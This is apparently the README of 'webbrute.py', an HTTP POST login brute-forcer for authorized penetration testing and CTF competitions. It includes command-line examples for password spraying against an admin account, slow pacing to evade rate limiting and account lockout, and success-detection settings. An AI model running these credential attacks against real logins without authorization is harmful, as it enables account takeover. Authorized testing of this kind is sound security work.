# webbrute.py

HTTP POST login brute-forcer for **authorized** penetration testing (CPTC / CTF /
scoped engagements).

> ⚠️ **Authorization:** Only run this against systems you own or have explicit
> written permission to test. Unauthorized credential attacks are illegal in most
> jurisdictions.

The target is described by a URL plus the POST body. Put the markers `^USER^` and
`^PASS^` wherever the username and password go in the body. If you don't supply
wordlists, common user/password lists are downloaded automatically from SecLists.

## Requirements

```bash
pip install requests
```

## Usage examples

### 1. Bare minimum — let it download wordlists
No lists supplied, so it grabs SecLists common users + top-1000 passwords automatically.
```bash
python3 webbrute.py \
  -u http://target.tld/login \
  -d "username=^USER^&password=^PASS^" \
  -f "Invalid credentials"
```

### 2. Single known user, spray passwords
You already know the username is `admin` — only iterate passwords.
```bash
python3 webbrute.py \
  -u http://target.tld/login \
  -d "username=^USER^&password=^PASS^" \
  -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  -f "incorrect"
```

### 3. Your own user + password lists
```bash
python3 webbrute.py \
  -u https://target.tld/admin/login \
  -d "user=^USER^&pass=^PASS^&submit=Login" \
  -L users.txt -P passwords.txt \
  -f "Login failed"
```

### 4. Success by redirect (no failure string)
Many apps return `302` to a dashboard on success. Detect that instead of body text.
```bash
python3 webbrute.py \
  -u https://target.tld/login \
  -d "username=^USER^&password=^PASS^" \
  -L users.txt -P passwords.txt \
  --success-code 302
```

### 5. Success by positive string
When the only reliable signal is text that appears **only when logged in**.
```bash
python3 webbrute.py \
  -u https://target.tld/login \
  -d "email=^USER^&password=^PASS^" \
  -l root@target.tld -P passwords.txt \
  -s "Logout"
```

### 6. API endpoint with custom headers + session cookie
`-H` is repeatable — pass CSRF tokens, cookies, content-type, etc.
```bash
python3 webbrute.py \
  -u https://target.tld/api/auth \
  -d "username=^USER^&password=^PASS^" \
  -L users.txt -P passwords.txt \
  -H "Cookie: PHPSESSID=abcd1234" \
  -H "X-Requested-With: XMLHttpRequest" \
  -s '"status":"ok"'
```

### 7. Go slow to dodge rate limiting / lockout
One thread, 2-second gap between tries — gentle on a monitored target.
```bash
python3 webbrute.py \
  -u https://target.tld/login \
  -d "username=^USER^&password=^PASS^" \
  -l admin -P passwords.txt \
  -f "Invalid" \
  -t 1 --delay 2
```

### 8. Go fast on a lab box, and don't stop at the first hit
```bash
python3 webbrute.py \
  -u http://10.10.10.5/login \
  -d "username=^USER^&password=^PASS^" \
  -L users.txt -P passwords.txt \
  -f "denied" \
  -t 20 --continue
```

## Flag reference

| Flag | Purpose |
|---|---|
| `-u` | target URL |
| `-d` | POST body, with `^USER^` / `^PASS^` markers |
| `-l` / `-L` | single username / username list |
| `-P` | password list |
| `-f` / `-s` | fail string / success string |
| `--fail-code` / `--success-code` | status-code detection |
| `-X` | HTTP method (default `POST`) |
| `-H` | extra header (repeatable) |
| `-t` / `--delay` | threads / per-thread delay |
| `--timeout` / `--retries` | request timeout / network retries |
| `--follow-redirects` | follow 3xx instead of treating it as success |
| `--continue` | keep going after first valid cred |

## Success detection

Pick whatever matches the target app:

| Option | Meaning |
|---|---|
| `-f "text"` | text appears **only on failure** → its absence = valid |
| `-s "text"` | text appears **only on success** |
| `--success-code 302` | status code means success (common for redirects) |
| `--fail-code 200` | status code means failure |
| *(none)* | a 3xx redirect or a new `Set-Cookie` is treated as success |

## Tip for CPTC

Capture a real failed login in Burp first, copy the exact POST body into `-d`
(swapping the creds for the `^USER^`/`^PASS^` markers), and copy the exact
"invalid login" text into `-f`. That gives the most reliable detection. If the
form uses a rotating CSRF token, the login page must be fetched and the token
scraped before each attempt — not yet implemented.
